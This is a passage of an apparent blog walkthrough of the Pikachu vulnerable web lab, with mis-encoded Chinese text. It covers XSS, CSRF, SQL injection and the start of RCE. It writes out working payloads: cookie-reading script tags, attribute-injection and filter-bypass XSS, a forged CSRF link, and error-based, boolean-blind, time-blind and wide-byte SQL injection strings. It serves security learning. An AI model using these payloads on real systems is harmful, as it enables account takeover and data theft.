href="#02-åå°„å‹xss-post" class="headerlink" title="02.åå°„å‹xss(post)"></a>02.åå°„å‹xss(post)</h3><p><code>æ ¹æ®æç¤ºç™»å…¥ï¼Œç›´æ¥æ‰“</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="03-å­˜å‚¨å‹xss"><a href="#03-å­˜å‚¨å‹xss" class="headerlink" title="03.å­˜å‚¨å‹xss"></a>03.å­˜å‚¨å‹xss</h3><p><code>æ²¡æœ‰è¿‡æ»¤ç›´æ¥æ‰“</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="04-DOMå‹xss"><a href="#04-DOMå‹xss" class="headerlink" title="04.DOMå‹xss"></a>04.DOMå‹xss</h3><p><code>æµ‹è¯•å‘ç°è¾“å…¥çš„å†…å®¹åœ¨&lt;a&gt;æ ‡ç­¾ä¸­ï¼Œåªæœ‰é—­åˆaæ ‡ç­¾æ‰å¯ä»¥æ’å…¥ä»»æ„ä»£ç </code></p><img src="/2021/04/28/Pikachu/image-20210426102947841.png" class><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onmouseover=&quot;alert(/xss/)&quot;&gt;</span></span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210426104744355.png" class><h3 id="05-DOMå‹xss-x"><a href="#05-DOMå‹xss-x" class="headerlink" title="05.DOMå‹xss-x"></a>05.DOMå‹xss-x</h3><p><code>åŒä¸Š</code></p><img src="/2021/04/28/Pikachu/image-20210426125421138.png" class><h3 id="06-xss-ç›²æ‰“"><a href="#06-xss-ç›²æ‰“" class="headerlink" title="06.xss ç›²æ‰“"></a>06.xss ç›²æ‰“</h3><p><code>å‰å°è¾“å…¥æ•°æ®ä¸ä¼šæ˜¾ç¤ºç»“æœï¼Œåªæœ‰ç™»å…¥åˆ°åå°æ‰ä¼šçœ‹åˆ°</code></p><img src="/2021/04/28/Pikachu/image-20210426130043847.png" class><p><code>æ¯æ¬¡åˆ·æ–°éƒ½ä¼šå¼¹çª—</code></p><img src="/2021/04/28/Pikachu/image-20210426130139582.png" class><h3 id="07-xssè¿‡æ»¤"><a href="#07-xssè¿‡æ»¤" class="headerlink" title="07.xssè¿‡æ»¤"></a>07.xssè¿‡æ»¤</h3><p><code>è¿‡æ»¤äº†scriptï¼Œä½¿ç”¨å¤§å°å†™ç»•è¿‡å³å¯</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;alert(<span class="regexp">/xss/</span>)&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210426131019115.png" class><h3 id="08-xssä¹‹htmlspecialchars"><a href="#08-xssä¹‹htmlspecialchars" class="headerlink" title="08.xssä¹‹htmlspecialchars"></a>08.xssä¹‹htmlspecialchars</h3><p><code>htmlspecialchars()å‡½æ•°å°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸ºHTMLå®ä½“</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; ï¼ˆå’Œå·ï¼‰æˆä¸º &amp;</span><br><span class="line">&quot; ï¼ˆåŒå¼•å·ï¼‰æˆä¸º &quot;</span><br><span class="line">&#39; ï¼ˆå•å¼•å·ï¼‰æˆä¸º &#39;</span><br><span class="line">&lt; ï¼ˆå°äºï¼‰æˆä¸º &lt;</span><br><span class="line">&gt; ï¼ˆå¤§äºï¼‰æˆä¸º &gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onmouseover=&#x27;</span>alert(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210426131739542.png" class><h3 id="09-xssä¹‹hreè¾“å‡º"><a href="#09-xssä¹‹hreè¾“å‡º" class="headerlink" title="09.xssä¹‹hreè¾“å‡º"></a>09.xssä¹‹hreè¾“å‡º</h3><p><code>ç‚¹å‡»è§¦å‘ä»£ç </code></p><img src="/2021/04/28/Pikachu/image-20210426132151201.png" class><h3 id="10-xssä¹‹jsè¾“å‡º"><a href="#10-xssä¹‹jsè¾“å‡º" class="headerlink" title="10.xssä¹‹jsè¾“å‡º"></a>10.xssä¹‹jsè¾“å‡º</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">demo&lt;<span class="regexp">/script&gt;&lt;script&gt;alert(/</span>xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210426133309084.png" class><h2 id="0x03-CSRF"><a href="#0x03-CSRF" class="headerlink" title="0x03.CSRF"></a>0x03.CSRF</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">CSRF(è·¨ç«™è¯·æ±‚ä¼ªé€ )æ¦‚è¿°</span><br><span class="line">Cross-site request forgery ç®€ç§°ä¸ºâ€œCSRFâ€ï¼Œ</span><br><span class="line">åœ¨CSRFçš„æ”»å‡»åœºæ™¯ä¸­æ”»å‡»è€…ä¼šä¼ªé€ ä¸€ä¸ªè¯·æ±‚ï¼ˆè¿™ä¸ªè¯·æ±‚ä¸€èˆ¬æ˜¯ä¸€ä¸ªé“¾æ¥ï¼‰ï¼Œ</span><br><span class="line">ç„¶åæ¬ºéª—ç›®æ ‡ç”¨æˆ·è¿›è¡Œç‚¹å‡»ï¼Œç”¨æˆ·ä¸€æ—¦ç‚¹å‡»äº†è¿™ä¸ªè¯·æ±‚ï¼Œæ•´ä¸ªæ”»å‡»å°±å®Œæˆäº†ã€‚</span><br><span class="line">æ‰€ä»¥CSRFæ”»å‡»ä¹Ÿæˆä¸º&quot;one click&quot;æ”»å‡»ã€‚ </span><br><span class="line">å¾ˆå¤šäººæä¸æ¸…æ¥šCSRFçš„æ¦‚å¿µï¼Œç”šè‡³æœ‰æ—¶å€™ä¼šå°†å…¶å’ŒXSSæ··æ·†,</span><br><span class="line">æ›´æœ‰ç”šè€…ä¼šå°†å…¶å’Œè¶Šæƒé—®é¢˜æ··ä¸ºä¸€è°ˆ,è¿™éƒ½æ˜¯å¯¹åŸç†æ²¡ææ¸…æ¥šå¯¼è‡´çš„ã€‚</span><br><span class="line">è¿™é‡Œåˆ—ä¸¾ä¸€ä¸ªåœºæ™¯è§£é‡Šä¸€ä¸‹ï¼Œå¸Œæœ›èƒ½å¤Ÿå¸®åŠ©ä½ ç†è§£ã€‚</span><br><span class="line">åœºæ™¯éœ€æ±‚ï¼š</span><br><span class="line">å°é»‘æƒ³è¦ä¿®æ”¹å¤§ç™½åœ¨è´­ç‰©ç½‘ç«™tianxiewww.xx.comä¸Šå¡«å†™çš„ä¼šå‘˜åœ°å€ã€‚</span><br><span class="line">å…ˆçœ‹ä¸‹å¤§ç™½æ˜¯å¦‚ä½•ä¿®æ”¹è‡ªå·±çš„å¯†ç çš„ï¼š</span><br><span class="line">ç™»å½•---ä¿®æ”¹ä¼šå‘˜ä¿¡æ¯ï¼Œæäº¤è¯·æ±‚---ä¿®æ”¹æˆåŠŸã€‚</span><br><span class="line">æ‰€ä»¥å°é»‘æƒ³è¦ä¿®æ”¹å¤§ç™½çš„ä¿¡æ¯ï¼Œä»–éœ€è¦æ‹¥æœ‰ï¼š1ï¼Œç™»å½•æƒé™ 2ï¼Œä¿®æ”¹ä¸ªäººä¿¡æ¯çš„è¯·æ±‚ã€‚</span><br><span class="line">ä½†æ˜¯å¤§ç™½åˆä¸ä¼šæŠŠè‡ªå·±xxxç½‘ç«™çš„è´¦å·å¯†ç å‘Šè¯‰å°é»‘ï¼Œé‚£å°é»‘æ€ä¹ˆåŠï¼Ÿ</span><br><span class="line">äºæ˜¯ä»–è‡ªå·±è·‘åˆ°www.xx.comä¸Šæ³¨å†Œäº†ä¸€ä¸ªè‡ªå·±çš„è´¦å·ï¼Œç„¶åä¿®æ”¹äº†ä¸€ä¸‹è‡ªå·±çš„ä¸ªäººä¿¡æ¯ï¼ˆæ¯”å¦‚ï¼šE-mailåœ°å€ï¼‰ï¼Œä»–å‘ç°ä¿®æ”¹çš„è¯·æ±‚æ˜¯ï¼š</span><br><span class="line">ã€http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Changeã€‘</span><br><span class="line">äºæ˜¯ï¼Œä»–å®æ–½äº†è¿™æ ·ä¸€ä¸ªæ“ä½œï¼šæŠŠè¿™ä¸ªé“¾æ¥ä¼ªè£…ä¸€ä¸‹ï¼Œåœ¨å°ç™½ç™»å½•xxxç½‘ç«™åï¼Œæ¬ºéª—ä»–è¿›è¡Œç‚¹å‡»ï¼Œå°ç™½ç‚¹å‡»è¿™ä¸ªé“¾æ¥åï¼Œä¸ªäººä¿¡æ¯å°±è¢«ä¿®æ”¹äº†,å°é»‘å°±å®Œæˆäº†æ”»å‡»ç›®çš„ã€‚</span><br><span class="line">ä¸ºå•¥å°é»‘çš„æ“ä½œèƒ½å¤Ÿå®ç°å‘¢ã€‚æœ‰å¦‚ä¸‹å‡ ä¸ªå…³é”®ç‚¹ï¼š</span><br><span class="line">1.www.xxx.comè¿™ä¸ªç½‘ç«™åœ¨ç”¨æˆ·ä¿®æ”¹ä¸ªäººçš„ä¿¡æ¯æ—¶æ²¡æœ‰è¿‡å¤šçš„æ ¡éªŒï¼Œå¯¼è‡´è¿™ä¸ªè¯·æ±‚å®¹æ˜“è¢«ä¼ªé€ ;</span><br><span class="line">---å› æ­¤ï¼Œæˆ‘ä»¬åˆ¤æ–­ä¸€ä¸ªç½‘ç«™æ˜¯å¦å­˜åœ¨CSRFæ¼æ´ï¼Œå…¶å®å°±æ˜¯åˆ¤æ–­å…¶å¯¹å…³é”®ä¿¡æ¯ï¼ˆæ¯”å¦‚å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ï¼‰çš„æ“ä½œ(å¢åˆ æ”¹)æ˜¯å¦å®¹æ˜“è¢«ä¼ªé€ ã€‚</span><br><span class="line">2.å°ç™½ç‚¹å‡»äº†å°é»‘å‘ç»™çš„é“¾æ¥ï¼Œå¹¶ä¸”è¿™ä¸ªæ—¶å€™å°ç™½åˆšå¥½ç™»å½•åœ¨è´­ç‰©ç½‘ä¸Š;</span><br><span class="line">---å¦‚æœå°ç™½å®‰å…¨æ„è¯†é«˜ï¼Œä¸ç‚¹å‡»ä¸æ˜é“¾æ¥ï¼Œåˆ™æ”»å‡»ä¸ä¼šæˆåŠŸï¼Œåˆæˆ–è€…å³ä½¿å°ç™½ç‚¹å‡»äº†é“¾æ¥ï¼Œä½†å°ç™½æ­¤æ—¶å¹¶æ²¡æœ‰ç™»å½•è´­ç‰©ç½‘ç«™ï¼Œä¹Ÿä¸ä¼šæˆåŠŸã€‚</span><br><span class="line">---å› æ­¤ï¼Œè¦æˆåŠŸå®æ–½ä¸€æ¬¡CSRFæ”»å‡»ï¼Œéœ€è¦â€œå¤©æ—¶ï¼Œåœ°åˆ©ï¼Œäººå’Œâ€çš„æ¡ä»¶ã€‚</span><br><span class="line">å½“ç„¶ï¼Œå¦‚æœå°é»‘äº‹å…ˆåœ¨xxxç½‘çš„é¦–é¡µå¦‚æœå‘ç°äº†ä¸€ä¸ªXSSæ¼æ´ï¼Œåˆ™å°é»‘å¯èƒ½ä¼šè¿™æ ·åšï¼š æ¬ºéª—å°ç™½è®¿é—®åŸ‹ä¼äº†XSSè„šæœ¬ï¼ˆç›—å–cookieçš„è„šæœ¬ï¼‰çš„é¡µé¢ï¼Œå°ç™½ä¸­æ‹›ï¼Œå°é»‘æ‹¿åˆ°å°ç™½çš„cookieï¼Œç„¶åå°é»‘é¡ºåˆ©ç™»å½•åˆ°å°ç™½çš„åå°ï¼Œå°é»‘è‡ªå·±ä¿®æ”¹å°ç™½çš„ç›¸å…³ä¿¡æ¯ã€‚</span><br><span class="line">---æ‰€ä»¥è·Ÿä¸Šé¢æ¯”ä¸€ä¸‹ï¼Œå°±å¯ä»¥çœ‹å‡ºCSRFä¸XSSçš„åŒºåˆ«ï¼šCSRFæ˜¯å€Ÿç”¨æˆ·çš„æƒé™å®Œæˆæ”»å‡»ï¼Œæ”»å‡»è€…å¹¶æ²¡æœ‰æ‹¿åˆ°ç”¨æˆ·çš„æƒé™ï¼Œè€ŒXSSæ˜¯ç›´æ¥ç›—å–åˆ°äº†ç”¨æˆ·çš„æƒé™ï¼Œç„¶åå®æ–½ç ´åã€‚</span><br><span class="line">å› æ­¤ï¼Œç½‘ç«™å¦‚æœè¦é˜²æ­¢CSRFæ”»å‡»ï¼Œåˆ™éœ€è¦å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå®æ–½å¯¹åº”çš„å®‰å…¨æªæ–½ï¼Œé˜²æ­¢è¿™äº›æ“ä½œå‡ºç°è¢«ä¼ªé€ çš„æƒ…å†µï¼Œä»è€Œå¯¼è‡´CSRFã€‚æ¯”å¦‚ï¼š</span><br><span class="line">--å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå¢åŠ å®‰å…¨çš„tokenï¼›</span><br><span class="line">--å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå¢åŠ å®‰å…¨çš„éªŒè¯ç ï¼›</span><br><span class="line">--å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå®æ–½å®‰å…¨çš„é€»è¾‘æµç¨‹ï¼Œæ¯”å¦‚ä¿®æ”¹å¯†ç æ—¶ï¼Œéœ€è¦å…ˆæ ¡éªŒæ—§å¯†ç ç­‰ã€‚</span><br></pre></td></tr></table></figure><h3 id="01-CSRF-get"><a href="#01-CSRF-get" class="headerlink" title="01.CSRF(get)"></a>01.CSRF(get)</h3><p><code>liliç™»å…¥ï¼Œgetä¼ å‚</code></p><img src="/2021/04/28/Pikachu/image-20210426134446159.png" class><p><code>ä¼ªé€ è¿æ¥è®©kobeç‚¹å‡»</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://81.70.195.159:8001/vul/csrf/csrfget/csrf_get_edit.php?sex=demo&amp;phonenum=110&amp;add=demo&amp;email=demo%40qq.com&amp;submit=submit</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210426134739431.png" class><h3 id="02-CSRF-post"><a href="#02-CSRF-post" class="headerlink" title="02.CSRF(post)"></a>02.CSRF(post)</h3><p><code>è¿™å›ç”¨kobeæ¬ºéª—lili</code></p><img src="/2021/04/28/Pikachu/image-20210426135921623.png" class><p><code>ç”ŸæˆPOCï¼Œè®©liliç‚¹</code></p><img src="/2021/04/28/Pikachu/image-20210426140028390.png" class><p><code>liliç™»å…¥ï¼Œliliç‚¹å‡»</code></p><img src="/2021/04/28/Pikachu/image-20210426140224883.png" class><p><code>ä¿®æ”¹æˆåŠŸ</code></p><img src="/2021/04/28/Pikachu/image-20210426140321498.png" class><h3 id="03-CSRF-token"><a href="#03-CSRF-token" class="headerlink" title="03.CSRF token"></a>03.CSRF token</h3><p><code>æŸ¥çœ‹æºç </code></p><h2 id="0x04-Sql-Inject"><a href="#0x04-Sql-Inject" class="headerlink" title="0x04.Sql Inject"></a>0x04.Sql Inject</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    åœ¨owaspå‘å¸ƒçš„top10æ’è¡Œæ¦œé‡Œï¼Œæ³¨å…¥æ¼æ´ä¸€ç›´æ˜¯å±å®³æ’åç¬¬ä¸€çš„æ¼æ´ï¼Œå…¶ä¸­æ³¨å…¥æ¼æ´é‡Œé¢é¦–å½“å…¶å†²çš„å°±æ˜¯æ•°æ®åº“æ³¨å…¥æ¼æ´ã€‚</span><br><span class="line">    </span><br><span class="line">ä¸€ä¸ªä¸¥é‡çš„SQLæ³¨å…¥æ¼æ´ï¼Œå¯èƒ½ä¼šç›´æ¥å¯¼è‡´ä¸€å®¶å…¬å¸ç ´äº§ï¼</span><br><span class="line">SQLæ³¨å…¥æ¼æ´ä¸»è¦å½¢æˆçš„åŸå› æ˜¯åœ¨æ•°æ®äº¤äº’ä¸­ï¼Œå‰ç«¯çš„æ•°æ®ä¼ å…¥åˆ°åå°å¤„ç†æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„åˆ¤æ–­ï¼Œ</span><br><span class="line">å¯¼è‡´å…¶ä¼ å…¥çš„â€œæ•°æ®â€æ‹¼æ¥åˆ°SQLè¯­å¥ä¸­åï¼Œè¢«å½“ä½œSQLè¯­å¥çš„ä¸€éƒ¨åˆ†æ‰§è¡Œã€‚ </span><br><span class="line">ä»è€Œå¯¼è‡´æ•°æ®åº“å—æŸï¼ˆè¢«è„±è£¤ã€è¢«åˆ é™¤ã€ç”šè‡³æ•´ä¸ªæœåŠ¡å™¨æƒé™æ²¦é™·ï¼‰ã€‚</span><br><span class="line">åœ¨æ„å»ºä»£ç æ—¶ï¼Œä¸€èˆ¬ä¼šä»å¦‚ä¸‹å‡ ä¸ªæ–¹é¢çš„ç­–ç•¥æ¥é˜²æ­¢SQLæ³¨å…¥æ¼æ´ï¼š</span><br><span class="line">1.å¯¹ä¼ è¿›SQLè¯­å¥é‡Œé¢çš„å˜é‡è¿›è¡Œè¿‡æ»¤ï¼Œä¸å…è®¸å±é™©å­—ç¬¦ä¼ å…¥ï¼›</span><br><span class="line">2.ä½¿ç”¨å‚æ•°åŒ–ï¼ˆParameterized Query æˆ– Parameterized Statementï¼‰ï¼›</span><br><span class="line">3.è¿˜æœ‰å°±æ˜¯,ç›®å‰æœ‰å¾ˆå¤šORMæ¡†æ¶ä¼šè‡ªåŠ¨ä½¿ç”¨å‚æ•°åŒ–è§£å†³æ³¨å…¥é—®é¢˜,ä½†å…¶ä¹Ÿæä¾›äº†&quot;æ‹¼æ¥&quot;çš„æ–¹å¼,æ‰€ä»¥ä½¿ç”¨æ—¶éœ€è¦æ…é‡!</span><br></pre></td></tr></table></figure><h3 id="01-æ•°å­—å‹æ³¨å…¥-post"><a href="#01-æ•°å­—å‹æ³¨å…¥-post" class="headerlink" title="01.æ•°å­—å‹æ³¨å…¥(post)"></a>01.æ•°å­—å‹æ³¨å…¥(post)</h3><p><code>ä¸€å…±ä¸¤ä¸ªå­—æ®µï¼Œçˆ†è¡¨çˆ†å­—æ®µä¸åœ¨èµ˜è¿°</code></p><img src="/2021/04/28/Pikachu/image-20210427091648529.png" class><h3 id="02-å­—ç¬¦å‹æ³¨å…¥-get"><a href="#02-å­—ç¬¦å‹æ³¨å…¥-get" class="headerlink" title="02.å­—ç¬¦å‹æ³¨å…¥(get)"></a>02.å­—ç¬¦å‹æ³¨å…¥(get)</h3><p><code>é—­åˆå•å¼•å·</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/vul/sqli/sqli_str.php?name=admin&#x27; or &#x27;1&#x27;=&#x27;1&amp;submit=æŸ¥è¯¢</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427092111715.png" class><h3 id="03-æœç´¢å‹æ³¨å…¥"><a href="#03-æœç´¢å‹æ³¨å…¥" class="headerlink" title="03.æœç´¢å‹æ³¨å…¥"></a>03.æœç´¢å‹æ³¨å…¥</h3><p><code>ç›´æ¥è¾“å…¥%%å³å¯ï¼Œ%%è¡¨ç¤ºæŸ¥è¯¢åˆ—æœ‰ä¸ä¸ºnullçš„å…¨éƒ¨å€¼</code></p><img src="/2021/04/28/Pikachu/image-20210427092429147.png" class><h3 id="04-xxå‹æ³¨å…¥"><a href="#04-xxå‹æ³¨å…¥" class="headerlink" title="04.xxå‹æ³¨å…¥"></a>04.xxå‹æ³¨å…¥</h3><p><code>é—­åˆå­—ç¬¦ä¸º&#39;) åŒç¬¬ä¸€é¢˜</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/vul/sqli/sqli_str.php?name=admin&#x27;) or 1=1 -- -&amp;submit=æŸ¥è¯¢</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427092840466.png" class><h3 id="05-insert-updateæ³¨å…¥"><a href="#05-insert-updateæ³¨å…¥" class="headerlink" title="05.insert/updateæ³¨å…¥"></a>05.insert/updateæ³¨å…¥</h3><p><code>æ³¨å†Œç‚¹å­˜åœ¨æ³¨å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admon&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427102044309.png" class><h3 id="06-deleteæ³¨å…¥"><a href="#06-deleteæ³¨å…¥" class="headerlink" title="06.deleteæ³¨å…¥"></a>06.deleteæ³¨å…¥</h3><p><code>åŒä¸Š</code></p><img src="/2021/04/28/Pikachu/image-20210427103706046.png" class><h3 id="07-http-header-æ³¨å…¥"><a href="#07-http-header-æ³¨å…¥" class="headerlink" title="07.http header æ³¨å…¥"></a>07.http header æ³¨å…¥</h3><p><code>æ³¨å…¥ç‚¹ä¸ºuser-agent/cookie</code></p><img src="/2021/04/28/Pikachu/image-20210427105308987.png" class><h3 id="08-ç›²æ³¨-base-boolian"><a href="#08-ç›²æ³¨-base-boolian" class="headerlink" title="08.ç›²æ³¨(base boolian)"></a>08.ç›²æ³¨(base boolian)</h3><p><code>é€å­—çˆ†ç ´æ•°æ®åº“ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºp</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27; and left((select database()),1)=&#x27;a&#x27;-- -</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427111803637.png" class><h3 id="09-ç›²æ³¨-base-time"><a href="#09-ç›²æ³¨-base-time" class="headerlink" title="09.ç›²æ³¨(base time)"></a>09.ç›²æ³¨(base time)</h3><p><code>è¾“å…¥ä»€ä¹ˆéƒ½åªæœ‰ä¸€ä¸ªå›æ˜¾</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27; and if(length(database())=7,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427112355990.png" class><h3 id="10-å®½å­—èŠ‚æ³¨å…¥"><a href="#10-å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="10.å®½å­—èŠ‚æ³¨å…¥"></a>10.å®½å­—èŠ‚æ³¨å…¥</h3><blockquote><p>payload</p><p>kobe%e0â€™ or 1=1 â€“ -</p></blockquote><img src="/2021/04/28/Pikachu/image-20210427151329767.png" class><h2 id="0x05-RCE"><a href="#0x05-RCE" class="headerlink" title="0x05.RCE"></a>0x05.RCE</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">RCE(remote command/code execute)æ¦‚è¿°RCEæ¼æ´ï¼Œ</span><br><span class="line">å¯ä»¥è®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç ï¼Œ</span><br><span class="line">ä»è€Œæ§åˆ¶åå°ç³»ç»Ÿã€‚è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œä¸€èˆ¬å‡ºç°è¿™ç§æ¼æ´ï¼Œ</span><br><span class="line">æ˜¯å› ä¸ºåº”ç”¨ç³»ç»Ÿä»è®¾è®¡ä¸Šéœ€è¦ç»™ç”¨æˆ·æä¾›æŒ‡å®šçš„è¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£æ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„è·¯ç”±å™¨ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç­‰è®¾å¤‡çš„webç®¡ç†ç•Œé¢ä¸Šä¸€èˆ¬ä¼šç»™ç”¨æˆ·æä¾›ä¸€ä¸ªpingæ“ä½œçš„webç•Œé¢ï¼Œ</span><br><span class="line">ç”¨æˆ·ä»webç•Œé¢è¾“å…¥ç›®æ ‡IPï¼Œæäº¤åï¼Œåå°ä¼šå¯¹è¯¥IPåœ°å€è¿›è¡Œä¸€æ¬¡pingæµ‹è¯•ï¼Œå¹¶è¿”å›æµ‹è¯•ç»“æœã€‚ </span><br><span class="line">è€Œï¼Œå¦‚æœï¼Œè®¾è®¡è€…åœ¨å®Œæˆè¯¥åŠŸèƒ½æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶ï¼Œ</span><br><span class="line">åˆ™å¯èƒ½ä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡è¯¥æ¥å£æäº¤â€œæ„æƒ³ä¸åˆ°â€çš„å‘½ä»¤ï¼Œä»è€Œè®©åå°è¿›è¡Œæ‰§è¡Œï¼Œ</span><br><span class="line">ä»è€Œæ§åˆ¶æ•´ä¸ªåå°æœåŠ¡å™¨ç°åœ¨å¾ˆå¤šçš„ç”²æ–¹ä¼ä¸šéƒ½å¼€å§‹å®æ–½è‡ªåŠ¨åŒ–è¿ç»´,å¤§é‡çš„ç³»ç»Ÿæ“ä½œä¼šé€šè¿‡&quot;è‡ªåŠ¨åŒ–è¿ç»´å¹³å°&quot;è¿›è¡Œæ“ä½œã€‚ </span><br><span class="line">åœ¨è¿™ç§å¹³å°ä¸Šå¾€å¾€ä¼šå‡ºç°è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„æ¼æ´,ä¸ä¿¡çš„è¯ç°åœ¨å°±å¯ä»¥æ‰¾ä½ ä»¬è¿ç»´éƒ¨çš„ç³»ç»Ÿæµ‹è¯•ä¸€ä¸‹,</span><br><span class="line">ä¼šæœ‰æ„æƒ³ä¸åˆ°çš„&quot;æ”¶è·&quot;-_-è¿œç¨‹ä»£ç æ‰§è¡ŒåŒæ ·çš„é“ç†,å› ä¸ºéœ€æ±‚è®¾è®¡,</span><br><span class="line">åå°æœ‰æ—¶å€™ä¹Ÿä¼šæŠŠç”¨æˆ·çš„è¾“å…¥ä½œä¸ºä»£ç çš„ä¸€éƒ¨åˆ†è¿›è¡Œæ‰§è¡Œ,ä¹Ÿå°±é€ æˆäº†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ </span><br><span class="line">ä¸ç®¡æ˜¯ä½¿ç”¨äº†ä»£ç æ‰§è¡Œçš„å‡½æ•°,è¿˜æ˜¯ä½¿ç”¨äº†ä¸å®‰å…¨çš„ååºåˆ—åŒ–ç­‰ç­‰ã€‚</span><br><span class="line">å› æ­¤ï¼Œå¦‚æœéœ€è¦ç»™å‰ç«¯ç”¨æˆ·æä¾›æ“ä½œç±»çš„APIæ¥å£ï¼Œ</span><br><span class="line">ä¸€å®šéœ€è¦å¯¹æ¥å£è¾“å…¥çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­ï¼Œæ¯”å¦‚å®æ–½ä¸¥æ ¼çš„ç™½åå•ç­–ç•¥ä¼šæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ–¹æ³•ã€‚</span><br></pre></td></tr></table></figure><h3 id="01-exec-ping"><a href="#01-exec-ping" class="headerlink" title="01.exec(ping)"></a>01.exec(ping)</h3><p><code>ç®€å•çš„å‘½ä»¤æ‰§è¡Œ</code></p><img src="/2021/04/28/Pikachu/image-20210427152244048.png" class><h2 id="02-exec-eval"><a href="#02-exec-eval" class="headerlink" title="02.exec(eval)"></a>02.exec(eval)</h2><p><code>å“åº”phpä»£ç </code></p><img src="/2021/04/28/Pikachu/image-20210427152552241.png" class><h2 id="0x06-æ–‡ä»¶åŒ…å«"><a 